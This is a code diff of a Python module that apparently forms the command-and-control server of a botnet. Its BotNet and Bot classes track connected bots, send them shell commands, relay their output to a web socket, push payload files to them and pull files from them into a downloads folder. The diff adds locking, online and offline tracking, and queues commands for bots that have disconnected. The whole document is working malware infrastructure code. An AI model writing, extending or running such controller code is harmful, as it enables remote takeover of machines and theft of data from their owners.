@@ -1,9 +1,10 @@
 import json
-from threading import Thread, Condition
-from threading import Lock
+from threading import Thread
+import threading
 import select
 import base64
 import os
+import time
 
 try:
     from server import formatsock, server
@@ -31,8 +32,8 @@ class BotNet(Thread):
 
     def __init__(self, socketio, payloadpath="payloads", downloadpath="media/downloads"):
         super().__init__()
-        self.connlock = Lock()
-        self.conncon = Condition(self.connlock)
+        self.connlock = threading.Lock()
+        self.conncon = threading.Condition(self.connlock)
         self.allConnections = {}
         self.logs = {}
         self.socketio = socketio
@@ -64,9 +65,28 @@ class BotNet(Thread):
                 self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                 print("[-] Lost connection to {}".format(user))
 
+    def setOffline(self, user):
+        # Will be making changes to allConnections
+        with self.connlock:
+            if user in self.allConnections:
+                # Wait for any sends to go through for this bot
+                # terminate and remove
+                try:
+                    self.allConnections[user].close()
+                except:
+                    pass
+                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
+                print("[-] Lost connection to {}".format(user))
+
     def getConnections(self):
         with self.connlock:
             return self.allConnections.keys()
+
+    def getConnectionDetails(self):
+        with self.connlock:
+            dets = {}
+            for username in self.allConnections.keys():
+                pass # TODO
 
     def run(self):
         while True:
@@ -110,12 +130,7 @@ class BotNet(Thread):
                     # Forward stdout/stderr... as needed
                     totallen = len(printout) + len(errout) + len(out) + len(err)
                     if totallen > 0:
-                        log = self.logs[user]
-                        log.logstdout(printout)
-                        log.logstderr(errout)
-                        log.logstdout(out)
-                        log.logstderr(err)
-
+                        # Send through socket
                         self.socketio.emit('response',
                                            {'user': user,
                                             'printout': printout,
@@ -123,6 +138,16 @@ class BotNet(Thread):
                                             'stdout': out,
                                             'stderr': err},
                                            namespace="/bot")
+                        # Separate to minimize time in Lock
+                        log = None
+                        with self.connlock:
+                            if user in self.logs:
+                                log = self.logs[user]
+                        if log:
+                            log.logstdout(printout)
+                            log.logstderr(errout)
+                            log.logstdout(out)
+                            log.logstderr(err)
 
                     if len(special) > 0:
                         if BotNet.LS_JSON in special:
@@ -144,8 +169,9 @@ class BotNet(Thread):
                         self.filemanager.closeFile(user, filename)
 
                 except IOError:
-                    # Connection was interrupted
-                    self.removeConnection(user)
+                    # Connection was interrupted, set to offline
+                    with self.connlock:
+                        self.removeConnection(user)
 
     def getLog(self, user):
         with self.connlock:
@@ -258,24 +284,69 @@ class Bot:
     FILE_DOWNLOAD = 'down'
     LS_JSON = 'ls'
 
-    def __init__(self, sock, host_info, socketio):
+    def __init__(self, sock, host_info, socketio, lastonline=int(time.time()), online=True):
         self.sock = formatsock.FormatSocket(sock)
         self.arch = host_info['arch'][:-1]
         self.user = host_info['user'][:-1]
-        self.botlock = Lock()
+
         self.socketio = socketio
+        self.lastonline = lastonline
+
+        # Threads can acquire RLocks as many times as needed, important for the queue
+        self.datalock = threading.RLock()
+        self.online = online
+        # Opqueue is a list of tuples of (function, (args...)) to be done once
+        # the bot in online
+        self.opqueue = []
 
     def send(self, cmd, type="stdin"):
         json_str = json.dumps({type: cmd})
-        with self.botlock:
-            self.sock.send(json_str)
+        with self.datalock:
+            if self.online:
+                self.sock.send(json_str)
+            else:
+                self.opqueue.append((self.send,(cmd,type)))
 
     def recv(self):
-        return self.sock.recv()
+        # Getting the object requires a lock, using it doesn't
+        with self.datalock:
+            sock = self.sock
+
+        # Try to receive, on error set offline
+        try:
+            return sock.recv()
+        except IOError as e:
+            # Setting offline requires a lock
+            with self.datalock:
+                self.online = False
+                self.lastonline = int(time.time())
+                raise e
+
+    def setsocket(self,newsock,nowonline=True):
+        with self.datalock:
+            if self.online:
+                self.sock.close()
+                self.sock = formatsock.FormatSocket(newsock)
+            self.online = nowonline
+            if self.online:
+                self.lastonline = int(time.time())
+                # Run operations if needed, this is where
+                # the RLock distinction is needed
+                for runop in self.opqueue:
+                    func, args = runop
+                    func(*args)
 
     def close(self):
-        with self.botlock:
-            self.sock.close()
+        with self.datalock:
+            if self.online:
+                self.online = False
+                self.lastonline = int(time.time())
+                try:
+                    self.sock.close()
+                    return True
+                except IOError:
+                    return False
+            return False
 
     def fileno(self):
         '''
@@ -283,50 +354,64 @@ class Bot:
         OS can wait for IO on the fileno and allow us to serve many bots
         simultaneously
         '''
-        return self.sock.fileno()
+        with self.datalock:
+            if self.online:
+                return self.sock.fileno()
+            else:
+                return -1
 
     def sendFile(self, filename, fileobj):
         # TODO: single worker thread instead of new one?
-        t = Thread(target=self.__sendFileHelper(fileobj, filename))
-        t.start()
+        with self.datalock:
+            if self.online:
+                t = Thread(target=self.__sendFileHelper(fileobj, filename))
+                t.start()
+            else:
+                self.opqueue.append((self.sendFile,(filename,fileobj)))
 
     def sendClientFile(self, fileobj):
         self.sendFile(None, fileobj)
 
     def __sendFileHelper(self, fileobj, filename=None):
-        with self.botlock:
-            dat = fileobj.read(Bot.FILE_SHARD_SIZE)
-            if len(dat) > 0:
-                while len(dat) > 0:
-                    # Turn the bytes into b64 encoded bytes, then into string
-                    bytestr = base64.b64encode(dat).decode('UTF-8')
-                    if filename:
-                        # Particular file
-                        json_str = json.dumps({Bot.FILE_STREAM: bytestr, Bot.FILE_FILENAME: filename})
-                    else:
-                        # Client file
-                        json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
-                    self.sock.send(json_str)
-                    dat = fileobj.read(Bot.FILE_SHARD_SIZE)
+        dat = fileobj.read(Bot.FILE_SHARD_SIZE)
+        if len(dat) > 0:
+            while len(dat) > 0:
+                # Turn the bytes into b64 encoded bytes, then into string
+                bytestr = base64.b64encode(dat).decode('UTF-8')
                 if filename:
-                    json_str = json.dumps({Bot.FILE_CLOSE: filename})
+                    # Particular file
+                    json_str = json.dumps({Bot.FILE_STREAM: bytestr, Bot.FILE_FILENAME: filename})
                 else:
-                    json_str = json.dumps({Bot.CLIENT_CLOSE: True})
+                    # Client file
+                    json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
+                with self.datalock:
+                    self.sock.send(json_str)
+                dat = fileobj.read(Bot.FILE_SHARD_SIZE)
+            if filename:
+                json_str = json.dumps({Bot.FILE_CLOSE: filename})
+            else:
+                json_str = json.dumps({Bot.CLIENT_CLOSE: True})
+            with self.datalock:
                 self.sock.send(json_str)
-                fileobj.close()
-                self.socketio.emit('success', {'user': self.user, 'message': "File upload successful"},
-                                   namespace='/bot')
+            fileobj.close()
+            self.socketio.emit('success', {'user': self.user, 'message': "File upload successful"},
+                               namespace='/bot')
 
     def startFileDownload(self, filename):
-        with self.botlock:
-            json_str = json.dumps({Bot.FILE_DOWNLOAD: filename})
-            self.sock.send(json_str)
+        with self.datalock:
+            if self.online:
+                json_str = json.dumps({Bot.FILE_DOWNLOAD: filename})
+                self.sock.send(json_str)
+            else:
+                self.opqueue.append((self.startFileDownload,(filename,)))
 
     def requestLs(self, filename):
-        with self.botlock:
-            json_str = json.dumps({Bot.LS_JSON: filename})
-            self.sock.send(json_str)
-
+        with self.datalock:
+            if self.online:
+                json_str = json.dumps({Bot.LS_JSON: filename})
+                self.sock.send(json_str)
+            else:
+                self.opqueue.append((self.requestLs,(filename,)))
 
 class BotLog:
     STDOUT = 0
